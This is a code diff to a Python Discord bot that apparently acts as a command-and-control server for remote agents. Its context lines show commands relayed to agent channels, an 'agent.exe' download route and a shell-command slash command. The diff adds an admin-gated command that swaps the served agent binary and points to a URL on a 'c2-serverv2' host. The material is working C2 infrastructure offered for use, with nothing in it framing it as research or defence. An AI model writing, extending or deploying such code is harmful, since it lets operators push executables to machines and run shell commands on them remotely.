@@ -15,6 +15,7 @@ CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
 AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
 STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
 PORT = int(os.getenv("PORT", 10000))
+ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")  # Role allowed to upload agent
 
 if not BOT_TOKEN:
     raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
@@ -61,7 +62,7 @@ async def handle_agent_download(request):
 app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
-app.router.add_get("/agent.exe", handle_agent_download)  # New route for updates
+app.router.add_get("/agent.exe", handle_agent_download)
 
 async def start_http_server():
     runner = web.AppRunner(app)
@@ -132,6 +133,31 @@ async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str,
     await channel.send(f"[CMD] {cmd_text}")
     await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
     return True
+
+# ------------------- ADMIN UPLOAD COMMAND -------------------
+@bot.tree.command(name="upload_agent", description="Upload a new agent binary (Admin only)")
+async def upload_agent(interaction: discord.Interaction, file: discord.Attachment):
+    # Check if user has the admin role
+    if not any(role.name == ADMIN_ROLE_NAME for role in interaction.user.roles):
+        await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
+        return
+
+    # Check file name (optional)
+    if not file.filename.endswith(".exe"):
+        await interaction.response.send_message("❌ File must be an .exe", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True, thinking=True)
+
+    # Save the file
+    file_path = os.path.join(os.path.dirname(__file__), "agent.exe")
+    try:
+        await file.save(file_path)
+        logger.info(f"New agent binary uploaded by {interaction.user}")
+        await interaction.followup.send(f"✅ Agent binary updated successfully. New version available at `https://c2-serverv2-qxvl.onrender.com/agent.exe`", ephemeral=True)
+    except Exception as e:
+        logger.error(f"Failed to save agent binary: {e}")
+        await interaction.followup.send(f"❌ Failed to save file: {e}", ephemeral=True)
 
 # ------------------- SLASH COMMANDS -------------------
 @bot.tree.command(name="run", description="Execute a shell command")
